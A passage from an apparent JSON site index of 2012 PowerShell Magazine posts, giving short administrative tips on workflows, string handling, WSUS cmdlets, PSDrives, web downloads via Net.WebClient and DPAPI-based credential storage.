PowerShell’s built-in commands—the ones available before any modules have been imported—work fine.\nThat isn’t the case with add-in modules, though. Further, because each workflow activity executes in a self-contained space, you can’t even use Import-Module by itself in a workflow. You’d basically import a module, but it would then go away by the time you tried to run any of the module’s commands.\nThe solution is to think of a workflow as a high-level task coordination mechanism. You’re likely to have a number of InlineScript{} blocks within a workflow because the contents of those blocks execute as a single unit, in a single PowerShell session. Within an InlineScript{}, you can import a module and then run its commands. Each InlineScript{} block that you include runs independently, so think of each one as a standalone script file of sorts: Each should perform whatever setup tasks are necessary for it to run successfully.\nSummary Workflows are an important new feature of PowerShell v3. They’re an incredibly rich, complex technology and a type of tool you can create and make great use of. We discussed the workflow facets and general design strategy.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/14/powershell-workflows/","tags":["News"],"title":"PowerShell Workflows"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nThe Get-Content cmdlet returns the contents of a file as an array of strings delimited by a newline character. In most cases this is not a problem but sometimes you’d want to get the content as one string instead of a collection of strings.\nIn PowerShell 2.0 and below, getting the file content as a single string required one of two methods:\n Use a .NET method to read all lines of the file  PS\u0026gt; $content = [System.IO.File]::ReadAllText($path)  Pipe the result of Get-Content to the Out-String cmdlet  PS\u0026gt; $content = Get-Content -Path $path | Out-String  In PowerShell 3.0 we now have a new dynamic parameter, Raw. When specified, Get-Content ignores newline characters and returns the entire contents of a file in one string. Raw is a dynamic parameter, it is available only in file system drives.\nPS\u0026gt; Get-Content $path -Raw   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/13/pstip-get-the-contents-of-a-file-in-one-string/","tags":["Tips and Tricks"],"title":"#PSTip Get the contents of a file in one string"},{"categories":["Tips and Tricks","Brainteaser"],"contents":"The -replace operator takes a regular expression (regex) replacement rule as input and replaces every match with the replacement string. The operator itself is used as shown in the following schema: \u0026lt;input string\u0026gt; -replace \u0026lt;replacement rule\u0026gt;,\u0026lt;replacement string\u0026gt;\nPS\u0026gt; \u0026quot;Hello. Yes, this is a cat.\u0026quot; -replace 'cat','dog' Hello. Yes, this is a dog. Although it is not obvious from the example, the ‘cat’ string is in fact a regular expression rule, and this rule can include special characters like “.” that don’t behave as you might expect.\nPS\u0026gt; \u0026quot;Hello. Yes, this is a cat.\u0026quot; -replace '.','dog' dogdogdogdogdogdogdogdogdogdogdogdogdogdogdogdogdogdogdogdogdogdogdogdog Problem is you often need to replace “.” , “|” or other characters that has special meaning in regex language. One way to achieve this is to escape every special character by “\\”.\nPS\u0026gt; \u0026quot;Hello. Yes, this is a dog.\u0026quot; -replace '\\.','!' Hello! Yes, this is a dog! Now you have two problems. You need to learn what characters are considered special in regex and check every replacement rule for these special characters, or take it a step forward and explicitly escape the whole string using a static method of the Regex type accelerator.\nPS\u0026gt; \u0026quot;Hello. Yes, this is a dog.\u0026quot; -replace [regex]::Escape('.'),'!' Hello! Yes, this is a dog! This enables you not only to escape the whole string at once, but also to ask the user for the replacement rule without worrying about any special character it may contain.\nAll that said there is String.Replace() method that does exactly the same as the example above. The main difference between the two is the replacement rule which is just plain text, not a regex rule. The method is used as such:\nPS\u0026gt; (\u0026quot;Hello. Yes, this is a dog.\u0026quot;).Replace('.','!') Hello! Yes, this is a dog! But since the –split, -replace, and -match operators are used pretty heavily in scripts there is a chance you are going to mix the –replace operator and Replace() method in one script, producing a script that is hard to understand and difficult to maintain because you require the maintainers to know the little differences in the usage.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/12/pstip-a-difference-between-the-replace-operator-and-string-replace-method/","tags":["Brainteaser","Tips and Tricks"],"title":"#PSTip A difference between the –replace operator and String.Replace method"},{"categories":["Brainteaser"],"contents":"Hello everyone! The Brain Teaser series continues.\nFirst, we need to announce the winner of the previous brain teaser. We got a lot of answers, but only three of them fulfilled all requirements ( the answers that use -split operator, the Split() method, or regex return the String objects, not System.Char objects). Bartek, Jaykul, and John Ludlow have had the correct answers.\nAnd the winner is… Bartek.\nThe editors of PowerShell Magazine think that his solution–“PowerShell”.GetEnumerator()–deserves the prize.\nHere goes the new brain teaser!\nYour new task is to get a list of running processes, assign it to a variable and output the result to the console window.\nUse the minimal number of characters. Be aware, a space is a character too. The shortest solution wins.\nYou need to send your answers by Friday and the winner will be announced on the next Monday. This time, the prize is the eBook version of Learn Windows PowerShell 3 in a Month of Lunches, Second Edition written by Don Jones and Jeffery Hicks. We would like to thank our sponsor Manning, a publisher of high quality computer books for professionals, for providing such a valuable prize. Manning is releasing the print version of Learn Windows PowerShell 3 in a Month of Lunches, Second Edition today.\nGood luck!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/12/assign-a-list-of-processes-to-a-variable-and-output-it-to-the-console/","tags":["Brainteaser"],"title":"Assign a list of processes to a variable and output it to the console"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nThis command is useful when you want to perform some tests or if you work in an environment where you use the standard and admin user accounts. Open Command Prompt and run the following command:\nC:\\\u0026gt; C:\\Windows\\System32\\runas.exe /env /noprofile /user:CHANGEME@TEST.LOCAL \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noprofile -command \\\"start-process powershell -verb RunAs\\\"\"  The best way to use it is to create a shorcut on your desktop and put it in the Target field.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/09/pstip-start-powershell-as-a-different-user-with-elevated-privileges/","tags":["Tips and Tricks"],"title":"#PSTip Start PowerShell as a different user with elevated privileges"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nWhen working with WMI and PowerShell, I often find it necessary to quickly generate a list of methods available in a WMI class. One way to do this is to examine the WMI class meta data. Let us see how:\nGet-WmiObject -Query 'Select * From Meta_Class WHERE __Class LIKE \"win32%\"' | Where-Object { $_.PSBase.Methods } | Select-Object Name, Methods  This will list all Win32 WMI classes with methods.\nIn Windows PowerShell 3.0, the same can be done using:\nGet-CimClass -ClassName win32* | where {$_.CimClassMethods} | select CimClassName,CimClassMethods  or\nGet-CimClass -ClassName win32* | where CimClassMethods -ne $null | select CimClassName,CimClassMethods   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/08/pstip-get-all-wmi-classes-with-methods/","tags":["Tips and Tricks"],"title":"#PSTip Get all WMI classes with methods"},{"categories":["Tips and Tricks"],"contents":"The Group-Object cmdlet lets you group objects based on the value of a specified property. For example:\nPS\u0026gt; Get-Service | Group-Object -Property Status Count Name Group ----- ---- ----- 93 Stopped {AeLookupSvc, AllUserInstallAgent, AppIDSvc, AppMgmt...} 81 Running {ALG, Appinfo, Apple Mobile Device, AudioEndpointBuilder...} This command gets the services and groups them by status. In addition to the Name and Count properties, you get back the objects of each group. If all you need is a Name/Count pair then you can tell Group-Object to omit the members of each group. The command will return the result much faster.\nPS\u0026gt; Get-ChildItem $env:WINDIR | Group-Object -Property Extension -NoElement Count Name ----- ---- 67 2 .Tmp 1 .NET 9 .exe 1 .dat 6 .log 2 .xml 1 .bin 2 .ini 1 .dll 1 .prx Sometimes you’d need to group objects based on a part of a property value. Luckily, Group-Object enables us to do so using an expression. The following command will help you to find out how many files in the current directory were changed per month:\nPS\u0026gt; Get-ChildItem | Group-Object { $_.LastWriteTime.Month } -NoElement | Sort-Object Name Count Name ----- ---- 37 1 45 10 33 11 36 12 22 2 27 3 19 4 29 5 37 6 34 7 190 8 46 9 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/07/pstip-grouping-objects/","tags":["Tips and Tricks"],"title":"#PSTip Grouping objects"},{"categories":["How To","Module Spotlight"],"contents":"With the release of Windows Server 2012 into the world, automating and managing Windows Server Update Services (WSUS) with PowerShell has become a little easier with the inclusion of the UpdateServices module. With the UpdateServices module, you get 12 cmdlets available to handle some of the more basic administration with WSUS that are listed in the table below.\n   Add-WsusComputer Get-WsusServer     Approve-WsusUpdate Get-WsusUpdate   Deny-WsusUpdate Invoke-WsusServerCleanup   Get-WsusClassification Set-WsusClassification   Get-WsusComputer Set-WsusProduct   Get-WsusProduct Set-WsusServerSynchronization    For this article, we will be using 5 of the cmdlets to manage the clients and updates on the WSUS server: Add-WsusComputer, Get-WsusUpdate, Deny-WsusUpdate, Get-WsusUpdate, and Get-WsusComputer.\nBefore moving forward with working with the UpdateServices module, you need to make sure that it is installed. Finding this can be done by running the following command.\nGet-Module -ListAvailable –Name UpdateServices If you see the module, then you are ready to go, but if not, then the below steps will help you out to install the module on your system.\nEnable UpdateServices module using the UI Open up Server Manager and then click Add Roles and Features to bring up wizard. Click next with the default selection of Role-based or feature-based installation. Click next at the next two windows until you are at the Features selection. Expand Remote Server Administration Tools, and then select Windows Server Update Services Tools. This will install the API, PowerShell module, and the Management Console for WSUS.\nEnable UpdateServices module using PowerShell Open up PowerShell and run the following command to enable WSUS.\nInstall-WindowsFeature -Name UpdateServices-RSAT A reboot will not be required once this has completed. When you have installed the UpdateServices module, you are ready to go with managing WSUS!\nClient management Finding all of your connected clients is as simple as running Get-WsusComputer. This command will show you all of your clients:\nGet-WsusComputer The Get-WsusComputer cmdlet contains some great parameters to help you filter exactly what you are looking for when searching for clients.\nFor instance, if you want to clean out clients that haven’t reported in 30 days, the following code will locate and remove the clients. Note that there is not a native cmdlet for removing a client from WSUS nor is it publicly available in the Microsoft.UpdateServices.Commands.WsusComputer object that Get-WsusComputer returns. We can work around this by using the WSUS API via the Get-WsusServer cmdlet and then use each computer name to call the GetComputerTargetByName() method followed by the Delete() method in the Microsoft.UpdateServices.Internal.BaseApi.ComputerTarget object that is available. I chose this hybrid approach because we can easily filter using the built-in cmdlet to get the list of computers and then run each of those through using the API to remove them from the server.\n#Used for the WSUS APIs $wsus = Get-WsusServer Get-WsusComputer -FromLastReportedStatusTime (Get-Date).AddDays(-30) | ForEach-Object { Write-Verbose (\"Removing {0} from WSUS\" -f $_.FullDomainName) $wsus.GetComputerTargetByName($_.Name).Delete() } Adding a client in WSUS to an existing Target Group is made simple using Add-WsusComputer and supplying a parameter for the TargetGroupName.\nGet-WsusComputer -NameIncludes Boe-PC | Add-WsusComputer -TargetGroupName \"Windows 2012\" –Verbose  Update management Similar to working with the clients, you can find all of the updates currently listed on the WSUS server by using Get-WsusUpdate A word of caution, using Get-WsusUpdate without any parameters will list all of the updates on the server which can take a bit of time.\nGet-WsusUpdate | Select-Object -First 10 My personal favorite parameter on this cmdlet is –Status parameter which can easily filter for updates that are needed by the clients. The –Status parameter takes the type of Microsoft.UpdateServices.Commands.WsusUpdateInstallationState. One way to find what the acceptable value is by using the following command:\n[Enum]::GetNames(Microsoft.UpdateServices.Commands.WsusUpdateInstallationState) NoStatus InstalledOrNotApplicable InstalledOrNotApplicableOrNoStatus Failed Needed FailedOrNeeded Any With this knowledge, we can run the following command to get all updates that are needed and have not been approved yet on the WSUS server.\nGet-WsusUpdate -Status Needed -Approval Unapproved These are just a few of the updates that are needed by the clients that will need to be approved so they can be compliant with patches.\nNow that we know how to get the required updates from the WSUS server, now it is time to start the approval process using Approve-WsusUpdate. The best approach to using this cmdlet is to pipe the output of Get-WsusUpdate into the Approve-WsusUpdate cmdlet followed by the TargetGroup and UpdateApprovalAction to complete the approval process.\nGet-WsusUpdate -Status Needed -Approval Unapproved | Approve-WsusUpdate -Action Install -TargetGroupName \"All Computers\" –Verbose On the flip-side, there are times when an update is not needed and was approved on accident or is just no longer needed by the clients. For this case, Deny-WsusUpdate is available to use to quickly decline the updates.\nGet-WsusUpdate -Approval Approved -Status NoStatus | Deny-WsusUpdate –Verbose So there you go! Using these cmdlets can allow you to quickly automate your patch and client management duties with PowerShell!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/07/client-and-patch-management-using-the-updateservices-module/","tags":["How To","Modules"],"title":"Client and patch management using the UpdateServices module"},{"categories":["News"],"contents":"The second edition of Don Jones and Jeffery Hicks’s bestseller, Learn Windows PowerShell 3 in a Month of Lunches, is released as an eBook. The printed version should be released on November 12.\nLearn Windows PowerShell3 in a Month of Lunches, Second Edition is an innovative tutorial designed for busy Windows administrators. Just set aside one hour a day for a month, and you’ll be automating Windows tasks faster than you ever thought possible. You’ll learn the practical techniques you need to make your job easier and your work day shorter. This revised second edition covers new PowerShell 3.0 features designed for Windows 8 and Windows Server 2012 (you can used them on some older operating systems as well :)).\nSource code, lab solutions, and two sample chapters are already available for free download.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/07/learn-windows-powershell-3-in-a-month-of-lunches/","tags":["News"],"title":"Learn Windows PowerShell 3 in a Month of Lunches"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nWhen I start writing a script, I generally start at the shell and make sure the logic I am working on holds good. Also, when writing blog posts, I tend to use the console – either powershell.exe or powershell ISE console – and then copy the commands into a blog post.\nSo, generally, I end up copying the last command I executed to either a blog post or a script. So, here is a small snippet I use to achieve that!\n(Get-History)[-1].commandline | clip  Simple! The trick to get the last executed command is to use an array index -1 which means the last item in the array. Now, all I need to do is put this in a simple function and put it in my profile for easy access:\nFunction Copy-LastCommand { (Get-History)[-1].commandline | clip }   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/post/2012-11-06-pstip-send-the-last-command-executed-to-clipboard/","tags":["Tips and Tricks"],"title":"#PSTip Send the last command executed to clipboard"},{"categories":["Tips and Tricks"],"contents":"When working with different PowerShell providers (PSProviders), the use of UNC paths can lead to error messages. This tip will show the pitfalls of using UNC paths when working with PowerShell providers other than the file system. For a full list of the PSProviders available on your system use the Get-PSProvider cmdlet:\nPS C:\\\u0026gt; Get-PSProvider Name Capabilities Drives ---- ------------ ------ Alias ShouldProcess {Alias} Environment ShouldProcess {Env} FileSystem Filter, ShouldProcess, Credentials {C, D, E, Q...} Function ShouldProcess {Function} Registry ShouldProcess, Transactions {HKLM, HKCU} Variable ShouldProcess {Variable} Certificate ShouldProcess {Cert} WSMan Credentials {WSMan}  The output shows the default PowerShell 2.0 providers. If you use PowerShell 3.0 or have imported, for example, ActiveDirectory or WebAdministration module, an output of your command will be different. PowerShell providers expose the PowerShell drives (PSDrive). We can change the current location to the Alias: PowerShell drive using the following command:\nPS C:\\\u0026gt; Set-Location -Path Alias:  Use the Get-ChildItem Cmdlet to list the contents of the root of this drive. We can export the output to CSV file without a problem:\nPS Alias:\\\u0026gt; Get-ChildItem | Export-Csv -Path C:\\Test.csv  However, when we attempt to do this by using a UNC path the command fails:\nPS Alias:\\\u0026gt; Get-ChildItem | Export-Csv -Path \\\\Server01\\c$\\TestUNC.csv Export-Csv : Cannot open file because the current provider (Microsoft.PowerShell.Core\\Alias) cannot open a file. At line:1 char:30 + Get-ChildItem -Path Alias: | Export-Csv -Path \\\\Server01\\c$\\TestUNC.csv + CategoryInfo : InvalidArgument: (:) [Export-Csv], PSInvalidOperationException There are two solutions to work around this issue. We can create a PSDrive that maps to the UNC path:\nPS Alias:\\\u0026gt; New-PSDrive -Name UNCPath -PSProvider FileSystem -Root \\\\Server01\\c$\\ PS Alias:\\\u0026gt; Get-ChildItem | Export-Csv -Path UNCPath:\\TestPSDrive.csv  Or explicitly state the PSProvider as shown in the following example:\nPS Alias:\\\u0026gt; Get-ChildItem | Export-Csv -Path Microsoft.PowerShell.Core\\FileSystem::\\\\Server01\\c$\\TestUNC.csv The Microsoft.PowerShell.Core\\ part of this command can be omitted, shortening the command to: PS Alias:\\\u0026gt; Get-ChildItem | Export-Csv -Path FileSystem::\\\\localhost\\c$\\TestUNC.csv  For more information regarding PowerShell provider you can refer to the built-in help topic by running Get-Help about_Providers.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/05/pstip-using-unc-paths-when-working-with-powershell-providers/","tags":["Tips and Tricks"],"title":"#PSTip Using UNC paths when working with PowerShell providers"},{"categories":["Brainteaser"],"contents":"Hello everyone! We are back with a series of Brain Teasers. In the next 3 weeks we will publish one teaser per week.\nIt will run until Friday and the winner will be announced on the next Monday, taking home the eBook version of Microsoft Windows PowerShell 3.0 First Look written by Adam Driscoll. We would like to thank our sponsor Packt, one of the most prolific and fast-growing tech book publishers in the world, for providing such a cool prize.\nOK, time to start your engine, here goes the first one 🙂\nYou have a string, “PowerShell”, you need to break it to its individual characters so the result is a collection of System.Char objects:\nP\no\nw\ne\nr\nS\nh\ne\nl\nl\nRequirements   You cannot cast the string to char array, e.g [char[]]”PowerShell”\n  You cannot use the String.ToCharArray method\n  The most shortest/elegant solution wins.\nGood luck!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/05/convert-a-string-to-a-character-array-2/","tags":["Brainteaser"],"title":"Convert a string to a character array"},{"categories":["Tips and Tricks"],"contents":"As I am still running PowerShell 2.0 on my work computer, I can’t use the Invoke-WebRequest cmdlet. This cmdlet is introduced in Windows PowerShell 3.0. When I need to download some web page, I still use my old .NET friend–Net.WebClient class.\nThe following command will download the Bing home page:\n(New-Object Net.WebClient).DownloadString(‘http://www.bing.com’  As I use this class frequently, I’ve created a function for that and I am exposing a Net.WebClient object as a variable to my global scope.\nfunction New-WebClient { $wc = New-Object Net.WebClient $wc.UseDefaultCredentials = $true $wc.Proxy.Credentials = $wc.Credentials $wc.Encoding = [System.Text.Encoding]::UTF8 $wc.CachePolicy = New-Object System.Net.Cache.HttpRequestCachePolicy([System.Net.Cache.HttpRequestCacheLevel]::NoCacheNoStore) Write-Output $wc } $Global:wc = New-WebClient  As you can see I’ve set also some other properties to satisfy my needs:\n Use of default credentials. As we user proxy with authentication, I need to pass my actual credentials to proxy. Setting encoding to UTF8 I am not using cache.  At the end of New-WebClient function, I send the object out and assign it to a global $wc variable. I can use it later as in the following command:\n$web = $wc.DownloadString('http://www.bing.com')  I know that some people uses this technique to process RSS channels. I don’t use it for this scenario, but you can download RSS channel, convert it to XML and then process in console. Frequent usage is:\nPS\u0026gt; $rss = $wc.DownloadString('http://feeds.feedburner.com/PowershellMagazine') PS\u0026gt; $rss.rss.channel.item | Format-Table Title title ----- Two new PowerShell modules related to Storage Spaces #PSTip How to speed up the Test-Connection command #PSTip Get system power information #PSTip Wait for executable to finish #PSTip Converting numbers to binary and back Using SkyDrive to sync your WindowsPowerShell folder #PSTip Get your reboot history #PSTip Converting numbers to HEX Connecting to Hyper-V virtual machines with PowerShell Manipulating Wildcards ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/02/pstip-access-web-from-powershell-console/","tags":["Tips and Tricks"],"title":"#PSTip Access web from PowerShell console"},{"categories":["Tips and Tricks"],"contents":"As I mentioned in my previous post, I like to have access to (almost) all my scripts on all machines. That’s why I have Scripts folder inside my Dropbox:\\PowerShell\\Profile. Anytime I have some nice script I drop it there and can use it.\n# Load all scripts Get-ChildItem (Join-Path ('Dropbox:\\PowerShell\\Profile') \\Scripts\\) | Where ` { $_.Name -notlike '__*' -and $_.Name -like '*.ps1'} | ForEach ` { . $_.FullName }  I am just running dir against Scripts folder and then check if the file has the .ps1 extension, but doesn’t start with “__” (double underscore). A reason? If I want to temporarily remove just one script from loading I will just rename it and prefix its name with a “__”. So, from the following list:\n[23]: dir Dropbox:\\PowerShell\\Profile\\Scripts | Sort Name | Select Name Name ---- __Set-Prompt.ps1 Credential.ps1 Get-EnumValue.ps1 Get-ExceptionDescription.ps1 Get-Menu.ps1 … The first script is not processed. The other scripts are piped to another command where I dot-source them. I also use auto-loading of my own format files.\n# Load format files Get-ChildItem (Join-Path ('Dropbox:\\PowerShell\\Profile\\Scripts') \\Format\\) | ForEach ` { Update-FormatData -AppendPath $_.FullName }  I use these format files to correctly format output from Configuration Manager WMI provider for some of my own scripts.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/01/pstip-how-to-automatically-dot-source-all-scripts-in-a-folder/","tags":["Tips and Tricks"],"title":"#PSTip How to automatically dot-source all scripts in a folder"},{"categories":["Tips and Tricks"],"contents":"As PowerShell drives are really useful concept, many people use it a lot. I also created some PSDrives for parts of my system I am accessing frequently. Let’s see it in my $profile. My two most frequently used drives are:\nPS\u0026gt; Get-PSDrive -Name D[or]* | Format-Table Name, Provider, Root -Auto Name Provider Root ---- -------- ---- Download Microsoft.PowerShell.Core\\FileSystem C:\\Documents and Settings\\Moravec\\My Documents\\Download Dropbox Microsoft.PowerShell.Core\\FileSystem C:\\Documents and Settings\\Moravec\\My Documents\\Dropbox My Dropbox folder–the obvious choice, and Download folder–that’s where I store all incoming files. You’ve already seen in one of the previous tips how to create a PowerShell drive. I can easily navigate to both of these drives:\nPS\u0026gt; cd download: PS Download:\\\u0026gt; ls Directory: C:\\Documents and Settings\\Moravec\\My Documents\\Download  The Registry PowerShell provider doesn’t expose all of the Registry hives as PowerShell drives. By default, we only get two of them:\nPS\u0026gt; cd download: PS\u0026gt; Get-PSDrive -PSProvider Registry Name Used (GB) Free (GB) Provider Root ---- --------- --------- -------- ---- HKCU Registry HKEY_CURRENT_USER HKLM Registry HKEY_LOCAL_MACHINE Sometimes I need also the others (especially as I frequently need to check/change/add something to HKEY_USERS). To create a new Registry PowerShell drive, you can use the following command:\nPS\u0026gt; New-PSDrive -Name HKU -PSProvider Registry –Root HKEY_USERS  You can do the same with other Registry hives. After adding additional drives, you can access all common Registry parts easily:\nPS\u0026gt; Get-PSDrive -PSProvider Registry Name Used (GB) Free (GB) Provider Root ---- --------- --------- -------- ---- HKCC Registry HKEY_CURRENT_CONFIG HKCR Registry HKEY_CLASSES_ROOT HKCU Registry HKEY_CURRENT_USER HKLM Registry HKEY_LOCAL_MACHINE HKU Registry HKEY_USERS ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/31/pstip-new-powershell-drive-psdrive/","tags":["Tips and Tricks"],"title":"#PSTip New PowerShell drive (PSDrive)"},{"categories":["Tips and Tricks"],"contents":"I frequently use different credentials to connect to some of my servers. Oh man, I wish I have just one account J As Configuration Manager is based on WMI, my most frequently used cmdlet is Get-WmiObject. And I use its Credential parameter to pass credentials I need for specific server. You can save your credentials to a variable by using the Get-Credential cmdlet.\nPS\u0026gt; $cred = Get-Credential domain\\makovec  But after some time it’s boring to do this every time I start my session. So, I am saving my credentials to a file and load it in $profile. I have three functions for working with credentials.\n New-DMCredential – creates a new file with credentials stored inside. Get-DMCredential – load credentials from a file (and then save it to a variable). Show-DMCredential – ehh, sometimes I forgot current password (especially after holiday). This one shows me password in clear text.  I got this idea of storing it this way from Lee Holmes’s PowerShell Cookbook. I’ve just written a function around his code. You can see dDM alias used in the following examples. This alias is used as a file name for stored credentials (used as output of New-DMCredential function and input of Get-DMCredential). The name of variable holding credential object is also based on this alias name.\nPS\u0026gt; New-DMCredential -UserName domain\\makovec -Alias dDM  It creates file with credentials. To be clear – the file doesn’t contain data in a clear text. It’s encrypted using Data Protection API.\nI can use this stored credentials to assign them to a variable (this is the line I have in my $profile):\nPS\u0026gt; Get-DMCredential -UserName domain\\makovec -Alias dDM  When I want to connect to one of my servers I can use this variable:\nPS\u0026gt; Connect-ConfigMgrProvider -ComputerName MyServer -Credential $dDM  Or I can see my password when needed:\nPS\u0026gt; Show-DMCredential $dDM Pa$$w0rd  Here are the functions I use. I’ve commented it inline.\nfunction New-DMCredential { [CmdletBinding()] param( [Parameter( Mandatory = $true, Position = 0 )] [string]$UserName, [Parameter( Mandatory = $true, Position = 1 )] [string]$Alias ) # Where the credentials will be stored $path = 'c:\\Scripts\\Resources\\cred\\' # get credentials for given username $cred = Get-Credential $UserName # and save encrypted text to a file $cred.Password | ConvertFrom-SecureString | Set-Content -Path (\u0026quot;$path\\$Alias\u0026quot;) } function Get-DMCredential { [CmdletBinding()] param( [Parameter( Mandatory = $true, Position = 0 )] [string]$UserName, [Parameter( Mandatory = $true, Position = 1 )] [string]$Alias ) # where to load credentials from $path = 'c:\\Scripts\\Resources\\cred\\' # receive cred as a PSCredential object $pwd = Get-Content -Path (\u0026quot;$path\\$Alias\u0026quot;) | ConvertTo-SecureString $cred = New-Object System.Management.Automation.PSCredential $UserName, $pwd # assign a cred to a global variable based on input Invoke-Expression \u0026quot;`$Global:$($Alias) = `$cred\u0026quot; Remove-Variable -Name cred Remove-Variable -Name pwd } } function Show-DMCredential { param($cred) # Just to see password in clear text [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($cred.Password)) }  I can probably change this script to module and make it a bit more user friendly. I will do that soon. At the moment–you can do that as your homework :).\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/30/pstip-storing-of-credentials/","tags":["Tips and Tricks"],"title":"#PSTip Storing of credentials"},{"categories":["News"],"contents":"If you start Windows PowerShell with the Run as Administrator option and then type Update-Help -Force -Verbose you should get the new version of some PowerShell Help XML-based files and About topics. Updatable Help contains a huge number of About topics:\n– 103 About topics for the Microsoft.PowerShell.Core module (actually, it’s a snap-in)\n– 1 About topic for the Microsoft.WSMan.Management module\n– 9 About topics for the PSWorkflow module\n– 4 About topics for the PSScheduledJob module\nThe new version is 3.1.0.0. Only the documentation for the en-US culture will be updated.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/30/new-version-of-powershell-help-files/","tags":["News"],"title":"New version of PowerShell Help files"},{"categories":["Tips and Tricks"],"contents":"When I was asked to provide some PowerShell tips, I decided to look at the first possible place–my $profile. When I started working with PowerShell few years ago I was looking for solution to have scripts available on all of my computers. Then I found easy solution–Dropbox. At the moment I have this structure:\nPS\u0026gt; Show-Tree Dropbox:\\PowerShell -Depth 1 Dropbox:\\PowerShell ├──Books ├──Mercurial ├──My ├──Papers ├──Presentations ├──Profile ├──pse_1.0.beta.x86 ├──Scripts ├──Trainings └──v3  You can see that for showing this structure, I’ve used Show-Tree function, a part of PowerShell Community Extensions. If you haven’t checked that one out yet, it’s time for it now. It has really a lot of very useful functions.\nFirst line of my $PROFILE.AllUsersAllHosts is:\nPS\u0026gt; Get-Content $PROFILE.AllUsersAllHosts | Select -First 1 New-PSDrive -Name Dropbox -PSProvider FileSystem -Root \"c:\\Documents and Settings\\Moravec\\My Documents\\Dropbox\" | Out-Null  This allows me to have available anything I am currently working on (plus all my favorite books). I’ve also modified the $PSModulePath automatic variable:\n$env:PSModulePath += ';Dropbox:\\PowerShell\\Profile' Just to ensure that when I add anything to Dropbox module folder, I’ll have it everywhere. For the same reason I created new “profile” script which I use for synchronizing my frequently using scripts and functions:\n. Dropbox:\\PowerShell\\Profile\\profile_Dropbox.ps1 I don’t use the same profile on all computers. On my home computer it’s not necessary to call, for example, a module I use for work with Configuration Manager. I know that I will never connect to my infrastructure from a personal netbook.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/29/pstip-script-sharing-using-dropbox-2/","tags":["Tips and Tricks"],"title":"#PSTip Script sharing using Dropbox"},{"categories":["News"],"contents":"Osama Sajid from the Windows Management Infrastructure team blogged about two WMI cheat sheets created by the WMI team. The first cheat sheet contains information to get you started with the CIM cmdlets in PowerShell 3.0. This is the updated version of WMI_CIM_PowerShell_v3.pdf cheat sheet, one of the Windows PowerShell 3.0 and Server Manager Quick Reference Guides. The second one is created as a great quick reference for developers and PowerShell power users who are interested in building CIM-based cmdlets and WMI providers.\nYou can download the cheat sheets at:\nhttp://blogs.msdn.com/b/powershell/archive/2012/10/28/wmi-cheat-sheet-for-ps-users.aspx\nhttp://blogs.msdn.com/b/wmi/archive/2012/10/28/wmi-cheat-sheet-and-link-to-msdn-documentation.aspx\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/29/cim-cmdlets-cheat-sheet-from-the-wmi-team/","tags":["News"],"title":"Two WMI cheat sheets for PowerShell users and developers from the WMI team!"},{"categories":["News"],"contents":"These videos were released yesterday on YouTube. They are part of the Windows Server 2012 Jump Start video series published on Microsoft TechNet.\nIn the following two-part module on Multi-Server Management Rick Claus and Corey Hynes focus on demo-rich conversations on essential features like Server Manager, PowerShell w/ ISE, Remote Management Tools and Remote Deployment.\nThere’s one word you’ll hear a lot in these videos. I guess you already know what that word is. 🙂\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/27/multi-server-management-with-windows-powershell/","tags":["News"],"title":"Multi-Server Management with Windows PowerShell"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nPowerShell lets you control how it responds to a non-terminating error (an error that does not stop the cmdlet processing) globally via the $ErrorActionPreference preference variable, or at a cmdlet level using the -ErrorAction parameter. Both ways support the following values:\nStop: Displays the error message and stops executing.\nInquire: Displays the error message and asks you whether you want to continue.\nContinue: Displays the error message and continues (Default) executing.\nSilentlyContinue: No effect. The error message is not displayed and execution continues without interruption.\nNo matter which value you choose, the error is written to the host and added to the $error variable. Starting with PowerShell 3.0, at a command level only (e.g ErrorAction), we have an additional value: Ignore. When Ignore is specified, the error is neither displayed not added to $error variable.\n# check the error count PS\u0026gt; $error.Count 0 # use SilentlyContinue to ignore the error PS\u0026gt; Get-ChildItem NoSuchFile -ErrorAction SilentlyContinue # error is ignored but is added to the $error variable PS\u0026gt; $error.Count 1 PS\u0026gt; $error.Clear() # Using Ignore truly discards the error and the error is not added to $error variable PS\u0026gt; 